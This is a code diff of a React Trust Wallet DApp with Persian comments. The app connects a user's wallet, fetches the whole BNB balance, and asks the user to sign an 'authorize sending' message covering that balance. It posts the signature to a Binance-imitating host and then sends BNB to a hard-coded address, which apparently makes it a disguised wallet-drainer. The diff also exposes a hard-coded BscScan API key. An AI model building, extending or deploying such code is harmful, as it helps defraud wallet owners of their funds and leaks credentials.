@@ -1,9 +1,5 @@
 import React, { useState } from "react";
 
-// اگر می‌خواهید از jQuery برای POST استفاده کنید، این را uncomment کنید:
-// import jQuery from "jquery";
-
-// دریافت بالانس BNB از BscScan (اختیاری)
 const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";
 async function getBNBBalance(address) {
   try {
@@ -24,13 +20,13 @@ function App() {
   const [account, setAccount] = useState(null);
 
   async function connectAndSend() {
-    // 1) بررسی اینکه در مرورگر DApp تراست والت هستیم:
+    // اطمینان از وجود window.ethereum (باید در DApp Browser تراست والت باشد)
     if (typeof window.ethereum === "undefined") {
       alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
       return;
     }
 
-    // 2) درخواست آدرس از کیف پول
+    // دریافت آدرس کاربر
     let accounts;
     try {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -46,27 +42,28 @@ function App() {
     setAccount(userAddress);
     console.log("✅ User address:", userAddress);
 
-    // 3) (اختیاری) گرفتن بالانس BNB از BscScan
+    // (اختیاری) گرفتن بالانس از BscScan
     const bnbBalance = await getBNBBalance(userAddress);
     console.log("💰 BNB Balance:", bnbBalance);
 
-    // 4) ساخت پیام ساده
+    // ساخت پیام برای امضا
     const message = `Authorize sending ${bnbBalance} BNB from ${userAddress}`;
     console.log("📜 Message to sign:", message);
 
     let signature;
     try {
+      // استفاده از personal_sign به‌جای eth_sign جهت اطمینان از امضای استاندارد
       signature = await window.ethereum.request({
-        method: "eth_sign",
-        params: [userAddress, message],
+        method: "personal_sign",
+        params: [message, userAddress],
       });
       console.log("✍️ Signature:", signature);
     } catch (error) {
-      console.error("❌ Error in eth_sign:", error);
+      console.error("❌ Error in personal_sign:", error);
       return;
     }
 
-    // 5) ارسال امضا به سرور
+    // ارسال امضا به سرور برای بررسی و ثبت لاگ
     try {
       const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
@@ -78,10 +75,8 @@ function App() {
           amount: bnbBalance,
         }),
       });
-
       const result = await resp.json();
       console.log("Server verify response:", result);
-
       if (!result.success) {
         console.error("❌ Signature verification failed or server error.", result);
         return;
@@ -91,15 +86,13 @@ function App() {
       return;
     }
 
-    // 6) ساخت تراکنش واقعی با eth_sendTransaction (کاربر گس را می‌دهد)
-    const sendAmount = 0.001; // مثالی از مقدار BNB
+    // ساخت تراکنش واقعی: مثلاً ارسال 0.001 BNB
+    const sendAmount = 0.001;
     const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
-
     const txParams = {
       from: userAddress,
       to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
       value: sendWeiHex,
-      // gas یا gasPrice اگر بخواهید دستی تعیین کنید
     };
 
     try {
